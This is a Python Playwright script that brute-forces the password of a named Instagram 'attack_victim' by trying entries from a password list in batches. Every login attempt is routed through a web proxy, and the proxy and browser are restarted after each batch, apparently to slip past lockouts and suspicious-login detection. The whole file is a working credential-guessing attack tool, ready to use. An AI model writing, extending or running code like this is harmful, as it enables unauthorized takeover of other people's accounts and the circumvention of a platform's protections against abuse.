import re
import csv
import math
import os
from playwright.sync_api import Page, expect

#PLaywright provies 2 mode, sync and async
from playwright.sync_api import sync_playwright

###################################################### CONTROLS #########################################################

# Make sure pass.csv and this file both are in same folder

attack_victim = '' # Enter USERNAME of VICTIM, make sure there are no gaps in between, and matches casing
proxium_link = 'https://proxyium.com/' # Can Use Any other webbased proxy/vpn service too!
instagram_link = 'https://instagram.com' # Fill https://instagram.com here might not work for anyother
wanna_see_code_working = False # Configue T/F if you wanna see the browser open and perform attack
delaytime = 8000 #Recommended, else this will cause chudap, increase if our internet is slow!!!!
passwords_to_try_in_each_loop = 5
file_path = f'{os.getcwd()}\\pass.csv' #Password file's path, For testing purpose add your account's password anywhere in the prerecorded list and see if it recognises your password
 
#########################################################################################################################

pop_up_text = "Decline optional cookies"
wrong_pass_message = "Sorry, your password was incorrect. Please double-check your password."

# WILL IMPORT PASSWORDS AS A LIST, csv_data HERE IS A LIST
with open(file_path, 'r') as f:
    csv_data = f.readlines()

password_found = False
# Defining function for reponse
def response_callback(response):
    # print(f"URL: {response.url}, Status Code: {response.status}")
    if "?next=%2F&" in response.url:
        global password_found
        password_found = True 

# Funtion to handle SUSPICIOUS LOGIN ATTEMPT POPUP:
def sus_login_attempt(page):
    message_locator = page.locator("p").get_by_text("Suspicious Login Attempt")
    return message_locator.is_visible()

# Function to handle wrong password text appearing below login button
def check_message(page, message_text):
    message_locator = page.locator("span").get_by_text(message_text)
    return message_locator.is_visible()

# Function to handle popups
def check_popup(page, pop_up_text):
    popup_locator = page.locator("button").get_by_text(pop_up_text)
    return popup_locator.is_visible()


#With sync api, it will close our browser when our code is finished
with sync_playwright() as p:
    
    # Decides how many times main loop would be running
    _ = len(csv_data)/passwords_to_try_in_each_loop
    run_main_loop_for = int(math.ceil(float(_)))
    
    # Printing Lengths
    print(f'Running main loop for {run_main_loop_for} times')
    print(f'Total passwords to try: {len(csv_data)}')
    
    # Initialising variables around which loops will work
    counter = 1
    second_loop_start = 0
    second_loop_end = second_loop_start + passwords_to_try_in_each_loop

    ####################################################### MAIN LOOP ##################################################

    for x in range(run_main_loop_for):
        browser = p.chromium.launch(headless= not wanna_see_code_working)
        page = browser.new_page()
        
        # Registering the response callback
        page.on("response", response_callback)

        # WILL OPEN PROXIUM
        page.goto(proxium_link)
        
        # WILL LOCATE INPUT FIELD ON PROXYIUM
        proxy_link = page.locator("#unique-form-control")
        
        # WILL FILL INSTAGRAM LINK IN THE INPUT FIELD OF PROXYIUM
        proxy_link.fill(instagram_link)
        
        # WILL CLICK GO BUTTON ON PROXYIUM
        proxy_link_btn = page.locator('#unique-btn-blue')
        proxy_link_btn.click()
        
        # WILL FILL USERNAME IN INPUT FIELD OF INSTAGRAM
        username = page.locator('input[aria-label="Phone number, username, or email"]')
        username.fill(attack_victim)

        if check_popup(page, pop_up_text):
                print("Popup detected")
                decline_option =  page.locator("button").get_by_text(pop_up_text)
                decline_option.click()
        else:
            print("No Popups detected")

        #################################################### SECOND LOOP ##################################################

        for password in csv_data[second_loop_start:second_loop_end]:
            print(f"Trying password {counter} - {password}")

            # WILL FILL PASSWORD IN PASS INPUT FIELD OF INSTAGRAM
            password_field = page.locator('input[aria-label="Password"]')
            password_field.fill(password)
            
            # WILL CLICK LOGIN BUTTON ON INSTAGRAM
            button_element = page.locator('button._acan._acap._acas._aj1-._ap30')
            button_element.click()

            while button_element.is_disabled() == True:
                page.wait_for_timeout(1000)
                print('Loading..')

            if sus_login_attempt(page):
                print("Suspicious Login Attempt page popped up, be cf big boi")
                password_found = True

            # pageas.wait_for_timeout(1000000000) # Had This For Debugging 

            if password_found == True:
                print("!!!Password Found!!!")
                print(f"Password = {password}")
                break
            
            if password_found == False:
                # click login btn again to make sure password is wrong!
                button_element = page.locator('button._acan._acap._acas._aj1-._ap30')
                button_element.click()
                print("Wrong Password")

            counter += 1

        if password_found == True:
            browser.close()
            break
        print('RESTARTING PROXY!')

        #Updating values for loop
        second_loop_start += 5
        second_loop_end += 5

        #To avoid left up passwords no being tried in passlist as multiple of 5
        if second_loop_end > len(csv_data):
            second_loop_end = len(csv_data)+1
        else:
            pass
        # WILL CLOSE THE BROWSER
        browser.close()





